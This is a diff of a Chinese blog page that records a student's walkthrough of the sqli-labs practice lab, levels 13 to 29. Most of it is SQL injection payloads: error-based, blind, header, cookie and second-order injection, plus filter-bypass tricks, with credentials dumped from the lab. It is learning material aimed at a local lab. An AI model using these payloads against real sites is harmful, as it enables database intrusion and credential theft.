@@ -29,7 +29,7 @@
 <meta property="og:description" content="sqli-lab靶场记录less-11234567891. ?id&#x3D;1 看到回显的用户名和密码2. ?id&#x3D;1&amp;#x27;--+ 看到数据库的语法错误，判断存在SQL注入漏洞3. ?id&#x3D;1&amp;#x27; order by 4--+ 时看到列数超过字段数，判断字段数为34. ?id&#x3D;1&amp;#x27; union select 1,2,3--+ 此时页面显示正常，但无法判断回显内容，原因是id&#x3D;1时数据">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-11-10T15:24:47.000Z">
-<meta property="article:modified_time" content="2022-11-10T15:27:07.039Z">
+<meta property="article:modified_time" content="2022-11-16T16:14:56.112Z">
 <meta property="article:author" content="Markcheng">
 <meta property="article:tag" content="学习 生活 分享 交流">
 <meta name="twitter:card" content="summary">
@@ -192,10 +192,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-11-10 23:24:47 / 修改时间：23:27:07" itemprop="dateCreated datePublished" datetime="2022-11-10T23:24:47+08:00">2022-11-10</time>
+              <time title="创建时间：2022-11-10 23:24:47" itemprop="dateCreated datePublished" datetime="2022-11-10T23:24:47+08:00">2022-11-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-17 00:14:56" itemprop="dateModified" datetime="2022-11-17T00:14:56+08:00">2022-11-17</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -297,12 +303,148 @@
 </ul>
 <h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><p>题目好像秀逗了，没有回显数据，不能布尔注入</p>
 <p>只能通过1’ or 1=1# 判断出这里的sql语句闭合的结构</p>
-<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>跟13一样，判断出来是双引号注入</p>
-<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><p>同13，14，都需要通过or 1=1 来判断sql语句的闭合是否正确，正确的话则显示登录成功，失败则显示登录失败</p>
-<p>可能题意也只是要我们判断这里的sql语句闭合类型和我们的注入类型即可，具体的布尔注入不需要去实现</p>
-<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>同上判断出是”)闭合，无法进行其他操作。</p>
-<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>从这里开始联合注入，布尔注入，时间盲注都不能用了！学习新知识–报错注入！</p>
+<p>再次学习，发现这是报错注入</p>
+<p>Updatexml（）</p>
+<p>updataxml（是mysql对xml文档函数进行出巡和修改的Xpath函数）</p>
+<p>函数有三个参数第一个数指定xml文档表的字段名称，第二个是指定要替换的位置，第三个是新的值，但这三个值都是错误的。</p>
+<p>第一个是不存在的，最后一个0因为前面的是不存在的所以替换也是没有意义的。关键是中间的数值，中间的数值也可以用表达式的形式，函数会把这个表达式执行了然后以报错的形式返回出来。</p>
+<p>mid()函数:</p>
+<p>mid(content,start,length);</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断回显位</span></span><br><span class="line"><span class="attribute">uname</span>=admin&#x27;)and <span class="attribute">1</span>=2 union select 1,2 --+&amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br><span class="line">发现没有显位</span><br><span class="line"></span><br><span class="line"><span class="comment">#有报错，使用报错注入</span></span><br><span class="line">库名</span><br><span class="line"><span class="attribute">uname</span>=admin&#x27;) <span class="keyword">and</span> updatexml(1,concat(0x7E,(database()),0x7E),1)--+&amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br><span class="line">表名</span><br><span class="line">1<span class="string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=(database())),0x7e),1)#</span></span><br><span class="line"><span class="string">列名--这里由于报错显示不完整，所以使用Mid函数来遍历查询结果直到获取所有的结果，表名也类似</span></span><br><span class="line"><span class="string">1&#x27;</span>) <span class="keyword">and</span> updatexml(1,concat(0x7e,mid((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>),1,10),0x7e),1)#</span><br><span class="line">用户和密码</span><br><span class="line">1<span class="string">&#x27;) and updatexml(1,concat(0x7e,mid((select group_concat(username,&#x27;</span>,<span class="string">&#x27;,password) from users),21,20),0x7e),1)#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 
+
+
+<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>跟13一样，判断出来是双引号注入</p>
+<p>其他步骤同13</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆库名</span><br><span class="line"><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br><span class="line">表明</span><br><span class="line">1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=(<span class="keyword">database</span>())),<span class="number">55</span>,<span class="number">20</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line">~emails,referers,uagents,users~</span><br><span class="line">列名</span><br><span class="line"><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),80,20),0x7e),1)#</span><br><span class="line">~USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password~</span><br><span class="line">账号和密码</span><br><span class="line">1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;,&#x27;</span>,<span class="keyword">password</span>) <span class="keyword">from</span> users),<span class="number">181</span>,<span class="number">20</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line">~Dumb,,Angelina,I-kill-you,Dummy,p@ssword,secure,crappy,stupid,stupidity,superman,genious,batman,mob!le,<span class="keyword">admin</span>,<span class="keyword">admin</span>,admin1,admin1,admin2,admin2,admin3,admin3,</span><br><span class="line">dhakkan,dumbo,admin4,admin4~</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><p>判断出是‘闭合,没有报错提醒，只有登录成功和登录失败，因此使用布尔盲注</p>
+<p>这里需要注意的是，and 两端的语句都为真，即admin’ and 1=1#才成立，前面的用户名不能为任意字符，因此使用or，虽然用户名不知，但是之后or后面的语句条件成立，则登录成功–逐渐爆破吧，是个体力活</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or length(database())&gt;7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=(<span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>同上判断出是”)闭合,同上进行或型布尔注入</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看源代码发现，这里需要我们输入一个数据库中已经存在的用户名，当然脚本会验证这个用户名的合法性以防止注入，当验证通过是就会到数据库中查询我们数据的账户名是否在数据库中，如果存在，则将用我们输入的密码替换数据库中原账户的密码</span><br></pre></td></tr></table></figure>
+
+<p>输入两个admin发现修改成功</p>
+<p>判断出是密码框注入</p>
+<p>其他步骤同13，闭合条件是’</p>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p><strong>UA注入</strong></p>
+<p>1、判断注入点</p>
+<p>登录成功后，User Agent回显，并且加’报错，判断注入点在User Agent</p>
+<p>2、判断闭合符 ‘</p>
+<p>User-Agent: ‘ and ‘1’=’1<br>3、获取数据</p>
+<p>库名<br>User-Agent:’ and updatexml(1,concat(0x7E,(database()),0x7E),1) and ‘1’=’1<br>表名<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7E),1) and ‘1’=’1<br>列名<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_name=’users’),0x7E),1) and ‘1’=’1<br>用户<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(username) from users)</p>
+<h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p><strong>referer注入</strong></p>
+<p>1、判断注入点</p>
+<p>登录成功后，User Agent回显，并且加’报错，判断注入点在User Agent</p>
+<p>2、判断闭合符 ‘</p>
+<p>User-Agent: ‘ and ‘1’=’1<br>3、获取数据</p>
+<p>库名<br>User-Agent:’ and updatexml(1,concat(0x7E,(database()),0x7E),1) and ‘1’=’1<br>表名<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7E),1) and ‘1’=’1<br>列名<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_name=’users’),0x7E),1) and ‘1’=’1<br>用户<br>User-Agent:’ and updatexml(1,concat(0x7E,(select group_concat(username) from users),0x7E),1) and ‘1’=’1</p>
+<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p><strong>COOKIE报错注入</strong></p>
+<p>遇到的问题：</p>
+<p>1.burp抓包时不能抓取本地包</p>
+<p>​    解决方法：在火狐浏览器地址栏输入about:config,将network.proxy…hijacking设置成true</p>
+<p>2.浏览器设置代理时无法访问服务器：</p>
+<p>​    一般是证书的问题，在地址栏输入http:burp，下载证书，然后将证书导入到浏览器即可</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br><span class="line">判断出<span class="number">2</span>，<span class="number">3</span>是回显位</span><br><span class="line"></span><br><span class="line">Cookie: uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,database(),version()<span class="meta">#</span></span><br><span class="line">查看数据库名和版本信息</span><br><span class="line"></span><br><span class="line">Cookie: uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=(database())<span class="meta">#</span></span><br><span class="line">查看表明，这里使用<span class="number">2</span>号显示位会报错</span><br><span class="line"></span><br><span class="line">Cookie: uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span><span class="meta">#</span></span><br><span class="line">查看列名</span><br><span class="line"></span><br><span class="line">Cookie: uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;,&#x27;</span>,username,<span class="string">&#x27;,&#x27;</span>,password) <span class="keyword">from</span> users<span class="meta">#</span></span><br><span class="line">得到账户名和密码</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>cookie-base64-单引号</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="keyword">admin</span><span class="string">&#x27;）</span></span><br><span class="line"><span class="string">Cookie: uname=YWRtaW4nKSM=</span></span><br><span class="line"><span class="string">判断单引号+括号闭合</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Cookie: uname=1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">Cookie: uname=MScpIHVuaW9uIHNlbGVjdCAxLDIsMyM=</span><br><span class="line">判断回显位</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) union select 1,2,database()#</span></span><br><span class="line"><span class="string">Cookie: uname=MScpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=</span></span><br><span class="line"><span class="string">查询数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=(<span class="keyword">database</span>())#</span><br><span class="line">Cookie: uname=MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9KGRhdGFiYXNlKCkpIw==</span><br><span class="line">查询表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyM=</span></span><br><span class="line"><span class="string">查询列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;,&#x27;</span>,username,<span class="string">&#x27;,&#x27;</span>,<span class="keyword">password</span>) <span class="keyword">from</span> users#</span><br><span class="line">MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGlkLCcsJyx1c2VybmFtZSwnLCcscGFzc3dvcmQpIGZyb20gdXNlcnMj</span><br><span class="line">获取账户名和密码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>判断出是admin”#双引号闭合，其他步骤同21</p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><h5 id="注释符绕过注入"><a href="#注释符绕过注入" class="headerlink" title="注释符绕过注入"></a>注释符绕过注入</h5><p>判断出是单引号闭合</p>
+<p>该题目下， 注释符号#。–+等会被过滤，因此不能注释我们注入语句后面的内容，因此我们构造语句闭合最后一个单引号</p>
+<p>采用时间盲注</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">8848</span>/Less-<span class="number">23</span>/?id=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>and%<span class="number">20</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))%<span class="number">3</span>E<span class="number">100</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)%<span class="number">20</span>and%<span class="number">20</span>%<span class="number">272</span>%<span class="number">27</span>=%<span class="number">272</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>1、创建一个admin’– -账号<br>设置密码为123<br>2、登录admin’– -账号<br>修改密码为123456<br>3、尝试用admin账号，登录密码123456</p>
+<p>相当于：</p>
+<p>update password=$new where username=admin’#</p>
+<p>（admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密）</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>and 和 or 的关键字绕过</p>
+<p>1、判断闭合符 <code>&#39;</code></p>
+<p>2、过滤了and、or，可以用||、|代替，或者双写绕过anandd、oorr</p>
+<p>3、获取数据和less-1相同</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用时间盲注</span><br><span class="line">http:<span class="regexp">//l</span>ocalhost:<span class="number">8848</span>/Less-<span class="number">25</span>/?id=<span class="number">1</span>%27%20|%20if(<span class="number">1</span>=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>过滤了or和and</p>
+<p>1,判断为数字型注入，无需加引号和注释</p>
+<p>2,采用时间盲注</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">8848</span>/Less-<span class="number">25</span>a/?id=<span class="number">1</span>%<span class="number">20</span>|%<span class="number">20</span>if(<span class="number">1</span>=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>绕过空格、注释、and,和or 的注入</p>
+<p>1、绕过注释和and、or使用anandd ‘1’=’1</p>
+<p>2、绕过空格发现使用+，%09，%0A，%0B，%0C，%0D，%A0，%20，/**/都无法绕过</p>
+<p>3、使用报错注入</p>
+<p>数据库名</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.220.135</span>/sql%<span class="number">20</span>injection/sqli-libs/Less-<span class="number">26</span>/index.php?id=<span class="number">1</span>&#x27; ||updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">2</span>E,database(),<span class="number">0</span>x<span class="number">7</span>E),<span class="number">1</span>)|| &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>FUNCTION <strong>security</strong>.updatexm does not exist<br>剩下的看less-6</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>在docker环境下</p>
+<p>用%27代替单引号</p>
+<p>用%0a代替空格，没有报错，使用联合查询或者布尔注入</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">数据库</span><br><span class="line">?id=&#x27;)union<span class="built_in">%a</span>0select<span class="built_in">%a</span>01,database(),<span class="number">3</span><span class="built_in">%a</span>0anandd&#x27;<span class="number">1</span>&#x27;=(&#x27;<span class="number">1</span></span><br><span class="line">表名</span><br><span class="line">id=&#x27;)union<span class="built_in">%a</span>0select<span class="built_in">%a</span>01,group_concat(table_name),<span class="number">3</span><span class="built_in">%a</span>0from<span class="built_in">%a</span>0infoorrmation_schema.tables<span class="built_in">%a</span>0where<span class="built_in">%a</span>0table_schema=database()<span class="built_in">%a</span>0anandd&#x27;<span class="number">1</span>&#x27;=(&#x27;<span class="number">1</span></span><br><span class="line">字段名</span><br><span class="line">id=&#x27;)union<span class="built_in">%a</span>0select<span class="built_in">%a</span>01,group_concat(column_name),<span class="number">3</span><span class="built_in">%a</span>0from<span class="built_in">%a</span>0infoorrmation_schema.columns<span class="built_in">%a</span>0where<span class="built_in">%a</span>0table_name=&#x27;users&#x27;<span class="built_in">%a</span>0anandd&#x27;<span class="number">1</span>&#x27;=(&#x27;<span class="number">1</span></span><br><span class="line">用户信息</span><br><span class="line">id=&#x27;)union<span class="built_in">%a</span>0select<span class="built_in">%a</span>01,group_concat(username),<span class="number">3</span><span class="built_in">%a</span>0from<span class="built_in">%a</span>0users<span class="built_in">%a</span>0anandd&#x27;<span class="number">1</span>&#x27;=(&#x27;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>union和select绕过</p>
+<p>这里发现空格也被过滤了</p>
+<p>判断是单引号闭合</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= &#x27;  uNion<span class="built_in">%a</span>0selEct<span class="built_in">%a</span>01,database(),<span class="number">3</span><span class="built_in">%a</span>0and(&#x27;<span class="number">1</span>&#x27;)=&#x27;<span class="number">1</span>使用联合注入</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>判断出是双引号闭合</p>
+<p>用大小写绕过union和select</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?id</span>=<span class="meta">%22</span><span class="meta">%a0</span><span class="meta">%a0uNion</span><span class="meta">%a0seleCt</span><span class="meta">%a0DATABASE</span>(),database(),DATABASE()<span class="meta">%a0and</span>(<span class="meta">%221</span><span class="meta">%22</span>)=<span class="meta">%221</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>根据?id=1’and’1’=’1和?id=2’and’1’=’1返回的页面相同，判断不是单引号闭合，但是由于单引号会影响到结果，判断是’)闭合</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询语句如下，括号内由于id是一个永真式，不影响查询结果</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(<span class="string">&#x27;1&#x27;</span><span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(<span class="string">&#x27;2&#x27;</span><span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用大小写绕过union和select</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?id</span>=<span class="meta">%27</span>)UNion<span class="meta">%a0seLect</span><span class="meta">%a01</span>,database(),<span class="number">3</span><span class="meta">%a0and</span><span class="meta">%271</span><span class="meta">%27</span>=(<span class="meta">%271</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>同样，根据?id=1’and’1’=’1和?id=2’and’1’=’1返回的页面相同判断出不是单纯的单引号闭合，原理同28</p>
+<p>使用大小写绕过union和select发现不行</p>
+<p>并且观察发现当union和select同时出现时才会被过滤，判断这里是把’union空格select’作为一个整体来过滤</p>
+<p>使用注释/**/代替空格成功绕过</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%27)%20uNion<span class="comment">/**/</span>Select%a01,database(),<span class="number">3</span>%20and%20%271%27=(%271</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3>
     </div>
 
     
@@ -339,7 +481,10 @@
     <a href="/2022/10/27/vulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" rel="prev" title="Vulhub漏洞靶场">
       <i class="fa fa-chevron-left"></i> Vulhub漏洞靶场
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="next" title="渗透测试">
+      渗透测试 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -398,7 +543,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-lab%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">sqli-lab靶场记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-1"><span class="nav-number">1.1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-2"><span class="nav-number">1.2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-3"><span class="nav-number">1.3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-4"><span class="nav-number">1.4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-5"><span class="nav-number">1.5.</span> <span class="nav-text">less-5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-6"><span class="nav-number">1.6.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-7"><span class="nav-number">1.7.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-8"><span class="nav-number">1.8.</span> <span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-9"><span class="nav-number">1.9.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-10"><span class="nav-number">1.10.</span> <span class="nav-text">less-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-11"><span class="nav-number">1.11.</span> <span class="nav-text">less-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-12"><span class="nav-number">1.12.</span> <span class="nav-text">less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-13"><span class="nav-number">1.13.</span> <span class="nav-text">less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-14"><span class="nav-number">1.14.</span> <span class="nav-text">less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-15"><span class="nav-number">1.15.</span> <span class="nav-text">less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-16"><span class="nav-number">1.16.</span> <span class="nav-text">less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-17"><span class="nav-number">1.17.</span> <span class="nav-text">less-17</span></a></li></ol></li></ol></div>
